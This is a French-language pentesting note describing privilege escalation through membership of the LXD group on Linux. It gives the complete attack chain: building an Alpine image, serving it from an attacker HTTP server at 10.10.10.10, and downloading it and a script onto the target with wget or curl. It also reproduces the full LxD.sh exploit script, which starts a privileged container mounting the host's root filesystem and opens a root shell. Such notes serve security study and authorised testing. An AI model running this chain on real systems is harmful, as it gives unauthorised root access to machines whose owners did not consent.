LxD est un container hypervisor qui permet aux utilisateurs membres du groupe de créer des containers sans utiliser sudo.
C'est un vecteur de Privilege Escalation.

# Utilisation du vecteur
## Côté attaquant
On va préparer une image de Linux Alpine pour LxD. Alpine est une sous-distribution légère de Linux (~5MB).
```bash
# Récupération du git
git clone https://github.com/saghul/lxd-alpine-builder  
cd lxd-alpine-builder
```

```bash
# Build de la distrib
sudo ./build-alpine
```

On a alors créé un fichier `.tar.gz` qu'on enverra au serveur.
Ensuite on se mets en mode serveur HTTP pour pouvoir la récupérer côté serveur.
```bash
sudo python3 -m http.server 80
```
*Alternative : on peut faire un `scp` si Python n'est pas installé/si on possède les creds de la session.*

## Côté serveur
Si on s'est mis en mode serveur HTTP, il faut récupérer le fichier :
```bash
wget http://10.10.10.10/alpine-v3.22-x86_64-20250716_2213.tar.gz
# ou alors
curl http://10.10.10.10/alpine-v3.22-x86_64-20250716_2213.tar.gz -o alpine.tar.gz
```

Ensuite, on importe le fichier [[#Fichier LxD.sh]] et on le lance.
```bash
wget http://10.10.10.10/LxD.sh
chmod +x LxD.sh  
./LxD.sh -f alpine-v3.22-x86_64-20250716_2213.tar.gz
```

**Et on possède maintenant les droits pour accéder au système root !**

## Fichier LxD.sh
```bash
#!/usr/bin/env bash  
  
# ----------------------------------  
# Authors: Marcelo Vazquez (S4vitar)  
# Victor Lasa (vowkin)  
# ----------------------------------  
  
function helpPanel(){  
echo -e "\nUsage:"  
echo -e "\t[-f] Filename (.tar.gz alpine file)"  
echo -e "\t[-h] Show this help panel\n"  
exit 1  
}  
  
function createContainer(){  
lxc image import $filename --alias alpine && lxd init --auto  
echo -e "[*] Listing images...\n" && lxc image list  
lxc init alpine privesc -c security.privileged=true  
lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true  
lxc start privesc  
lxc exec privesc sh  
cleanup  
}  
  
function cleanup(){  
echo -en "\n[*] Removing container..."  
lxc stop privesc && lxc delete privesc && lxc image delete alpine  
echo " [√]"  
}  
  
set -o nounset  
set -o errexit  
  
declare -i parameter_enable=0; while getopts ":f:h:" arg; do  
case $arg in  
f) filename=$OPTARG && let parameter_enable+=1;;  
h) helpPanel;;  
esac  
done  
  
if [ $parameter_enable -ne 1 ]; then  
helpPanel  
else  
createContainer  
fi
```